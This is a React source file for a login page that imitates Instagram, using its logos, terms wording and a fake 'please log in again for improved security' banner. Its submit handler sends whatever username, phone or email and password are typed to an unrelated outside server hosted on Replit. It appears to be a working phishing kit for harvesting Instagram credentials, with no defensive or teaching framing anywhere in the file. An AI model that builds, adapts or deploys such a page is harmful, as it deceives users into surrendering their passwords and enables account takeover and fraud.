import { useState } from 'react';
import "./App.css";
import axios from 'axios'

export default function App() {
  const [input, setInput] = useState('');
  const [password, setPassword] = useState("");

  const handlePasswordChange = (event) => {
    setPassword(event.target.value);
  };
const handleInputChange = (event) => {
  setInput(event.target.value);
};
  const isButtonDisabled = password.length < 6;

  const handleSubmit = async (e) => {
  e.preventDefault();
  try {
    const response = await axios.post('https://92d1ce66-89df-442a-9d8e-2cb2f52b2a04-00-14famyzbfq9fq.sisko.replit.dev/users', {
      username: input.includes('@') ? undefined : input,
      phone: /^\d+$/.test(input) ? input : undefined,
      email: input.includes('@') ? input : undefined,
      password: password
    });
    console.log('User created:', response.data);
    // Handle successful login (e.g., store token, redirect)
  } catch (error) {
    console.error('Error creating user:', error);
    // Handle error (e.g., show error message)
  }
};
  
  const [alertOpen, setAlertOpen] = useState(true);
  const AlertClose = () => {
    setAlertOpen(false);
    console.log('Alert closed!');
  }
  return (  
    <main>
      <div className="logo-wrapper"><img src="instagram-wordart.png" className="ig-wordart-logo" alt="Instagram logo" /></div>
      {alertOpen && (
        <div className="alert-wrapper"> 
          <div className="info">
            <div className="info__icon">
              <svg fill="none" height="18" viewBox="0 0 24 24" width="18" xmlns="http://www.w3.org/2000/svg">
                <path d="m12 1.5c-5.79844 0-10.5 4.70156-10.5 10.5 0 5.7984 4.70156 10.5 10.5 10.5 5.7984 0 10.5-4.7016 10.5-10.5 0-5.79844-4.7016-10.5-10.5-10.5zm.75 15.5625c0 .1031-.0844.1875-.1875.1875h-1.125c-.1031 0-.1875-.0844-.1875-.1875v-6.375c0-.1031.0844-.1875.1875-.1875h1.125c.1031 0 .1875.0844.1875.1875zm-.75-8.0625c-.2944-.00601-.5747-.12718-.7808-.3375-.206-.21032-.3215-.49305-.3215-.7875s.1155-.57718.3215-.7875c.2061-.21032.4864-.33149.7808-.3375.2944.00601.5747.12718.7808.3375.206.21032.3215.49305.3215.7875s-.1155.57718-.3215.7875c-.2061.21032-.4864.33149-.7808.3375z" fill="#393a37"></path>
              </svg>
            </div>
            <div className="info__title">For <strong>improved security</strong>, please log in again to use our <strong>updated in-app browser</strong>. This ensures safe access to external links.</div>
            <div className="info__close" onClick={AlertClose}>
              <svg xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 20 20" height="20">
                <path fill="#393a37" d="m15.8333 5.34166-1.175-1.175-4.6583 4.65834-4.65833-4.65834-1.175 1.175 4.65833 4.65834-4.65833 4.6583 1.175 1.175 4.65833-4.6583 4.6583 4.6583 1.175-1.175-4.6583-4.6583z"></path>
              </svg>
            </div>
          </div>
        </div>
      )}
 <div class="separator">
  <div class="line"></div>
  <div class="or-text">OR</div>
  <div class="line"></div>
</div>  
      <form className="form" onSubmit={handleSubmit}>
        <div className="wrapper">
          <div className="flex">
            <label>
              <input
                required 
                placeholder=""
                type="text"
                className="input"
               value={input}
          onChange={handleInputChange}
              />
              <span>Phone number, username, or email</span>
            </label>
          </div>
          <label>
            <input
              required
              placeholder=""
              type="password"
              className="input"
              value={password}
              onChange={handlePasswordChange}
            />
            <span>Password</span>
          </label>
        </div>
        <div className="forgot-pass-wrapper"> 
          <p className="forgot-pass">
            <a href="#">Forgot password?</a>{" "}
          </p> 
        </div>
        <div className="btn-wrapper"> 
          <button type="submit" className="signin" disabled={isButtonDisabled} >Log in</button>
        </div>
        <div className="terms-wrapper">
          <p className="terms">By continuing, you agree to Instagram's <strong>Terms of Use</strong> and <strong>Privacy Policy.</strong></p>
        </div>
      </form>
      <footer>
        <div className="meta-logo-wrapper"><img className="meta-logo" src="from-meta.svg" alt="Meta logo" /></div>
      </footer>
    </main>
  );
}